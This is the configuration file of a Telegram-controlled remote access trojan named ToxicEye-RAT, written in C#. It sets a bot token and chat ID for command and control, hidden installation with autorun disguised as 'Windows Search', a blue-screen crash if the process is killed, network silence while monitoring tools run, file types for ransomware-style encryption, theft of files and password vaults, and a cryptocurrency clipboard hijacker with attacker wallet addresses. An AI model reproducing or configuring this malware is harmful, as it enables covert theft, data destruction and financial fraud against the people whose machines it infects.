/* 
       ^ Author    : LimerBoy
       ^ Name      : ToxicEye-RAT
       ^ Github    : https:github.com/LimerBoy

       > This program is distributed for educational purposes only.
*/


namespace TelegramRAT
{
    internal sealed class config
    {
        // Telegram settings.
        public const string TelegramToken = "6066843181:AAGvTPs7zdNwCxPybc7rL80llGCVJdS9_Xw";
        public const string TelegramChatID = "354024606";
        public static int TelegramCommandCheckDelay = 5;
        // Installation to system.
        public static bool AdminRightsRequired = true;
        public static bool AttributeHiddenEnabled = true;
        public static bool AttributeSystemEnabled = true;
        public static bool MeltFileAfterStart = true;
        public static string InstallPath = @"C:\Users\NotAdministratorFolder12\rat.exe";
        // Add to startup.
        public static bool AutorunEnabled = true;
        public static string AutorunName = "Windows Search";
        // Protect process with BSoD (if killed).
        public static bool ProcessBSODProtectionEnabled = true;
        // Hide console window. Need for debugging.
        public static bool HideConsoleWindow = true;
        // Do not start trojan if it running in VirtualBox, VMWare, SandBoxie, Debuggers.
        public static bool PreventStartOnVirtualMachine = false;
        // Start delay (in seconds).
        public static int StartDelay = 0;
        // The program will not make requests to telegram api if processes are running below.
        public static bool BlockNetworkActivityWhenProcessStarted = true;
        // Process list
        public static string[] BlockNetworkActivityProcessList =
        {
            "taskmgr", "processhacker",
            "netstat", "netmon", "tcpview", "wireshark",
            "filemon", "regmon", "cain", "cmd", "powershell"
        };
        // Types of files to be encrypted
        public static string[] EncryptionFileTypes =
        {
            ".lnk",
            ".png", ".jpg", ".bmp", ".psd",
            ".pdf", ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt",
            ".csv", ".sql", ".mdb", ".sln", ".php", "py", ".asp", ".aspx", ".html", ".xml"
        };
        // Maximum file size to grab (in bytes).
        public static long GrabFileSize = 6291456;
        // What types of files will be downloaded from the computer when executing the /GrabDesktop command.
        public static string[] GrabFileTypes =
        {
            ".kdbx",
            ".png", ".jpg", ".bmp",
            ".pdf", ".txt", ".rtf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt",
            ".sql", ".php", ".py", ".html", ".xml", ".json", ".csv"
        };
        // Automatically steal all passwords and send to chat at first start.
        public static bool AutoStealerEnabled = false;
        // Clipper is enabled
        public static bool ClipperEnabled = true;
        // Your wallet addresses
        public static string bitcoin_address = "bc1q7uk9fautt5ft33373ypgnzf3vl9q878q6nfxaf";
        public static string etherium_address = "0x7bECa46F488a6FcBD562dFe6Fc949B911DD4A182";
        public static string monero_address = "42KAht1LuA8jEzwoYYAsQGa4NzgdBXEtiC1WGsHPvZXcTEjA5DBChVD6x32j2UFfqLiE7BXUfL4bHXgKyHFLChpfUPyHNMS";
    }
}
